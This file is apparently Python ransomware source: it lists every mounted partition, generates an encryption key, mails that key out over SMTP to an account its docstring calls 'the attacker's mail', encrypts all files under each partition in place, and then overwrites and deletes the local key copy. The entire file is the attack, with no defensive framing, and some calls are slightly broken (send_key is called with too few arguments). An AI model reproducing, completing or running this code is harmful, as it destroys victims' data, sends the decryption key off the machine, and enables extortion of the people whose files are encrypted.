import string, random
from cryptography.fernet import Fernet
from os.path import join, isfile
from os import getcwd, remove, walk, chdir, urandom
from tempfile import gettempdir
from psutil import disk_partitions
from smtplib import SMTP, SMTPException
from subprocess import check_output


def send_key(mail, password, key)->bool:
    '''
    send key to the attacker's mail
    '''
    try:
        user = check_output('whoami',shell=True).decode('utf-8')
        msg = f'Subject: Key from {user}\nKEY: {key}\n\n'
        server = SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(mail, password)
        server.sendmail(mail, mail, msg)
        server.quit()
        return True
    except SMTPException as e:
        # print('[-] Exception : ', e)
        return False


def get_partitions_path():
    '''
    get all mounted partition's mount point
    '''
    mount_points = []
    for partition in disk_partitions():
        mount_points.append(partition.mountpoint)
    return mount_points


def create_key(path):
    '''
    generate new key
    '''
    cwd = getcwd()
    chdir(path)

    key = Fernet.generate_key()
    key_path = join(path, KEY_FILE)
    with open(key_path,'wb') as key_file:
        key_file.write(key)
        send_key('youremail', 'AppPassword')
    chdir(cwd)


def read_key(path):
    '''
    get key
    '''
    key_path = join(path, KEY_FILE)

    if isfile(key_path):
        cwd = getcwd()
        chdir(path)
        key = open(key_path, 'rb').read()
        chdir(cwd)
        return key
    


def encrypt_file(file_path, key):
    '''
    encrypts the specified file
    '''
    fernet = Fernet(key)
    file_data = None
    # read file data
    with open(file_path, 'rb') as file:
        file_data = file.read()
    
    # encrypt file data
    enc_file_data = fernet.encrypt(file_data)

    # write encrypted file
    with open(file_path, 'wb') as file:
        file.write(enc_file_data)


def encrypt_child_files(root_path, key):
    '''
    encrypt all files in folders/subfolders of the specified root path
    '''
    for root, dirs, files in walk(root_path):
        chdir(root)
        
        for file in files:
            file_path = join(root, file)
            encrypt_file(file_path,key)


def delete_key():
    '''
    writes a new key to the key file and then deletes it.
    '''
    tempdir = gettempdir()
    key_file_path = join(tempdir, KEY_FILE)

    with open(key_file_path, 'rb+') as key_file:
        key_len = len(key_file.read())
        chars = string.ascii_letters + string.digits + '!@#$%^&*()_+-=*,.;?:~"{[]}'
        random.seed = urandom(1024)
        new_fake_key = ''.join(random.choice(chars) for i in range(key_len)).encode('utf-8')
        key_file.write(new_fake_key)

    remove(key_file_path)


def start_ransom_attack(paths:list):
    '''
    start encrypting data on specified paths
    '''
    tempdir = gettempdir()
    create_key(tempdir)
    KEY = read_key(tempdir)

    for path in paths:
        encrypt_child_files(path, KEY)
    
    # remove keys 
    delete_key()


if __name__ == '__main__':
    print('[*] Starting Please Wait.....')
    KEY_FILE = 'key.dmsec'
    PATHS = get_partitions_path()
    start_ransom_attack(PATHS)
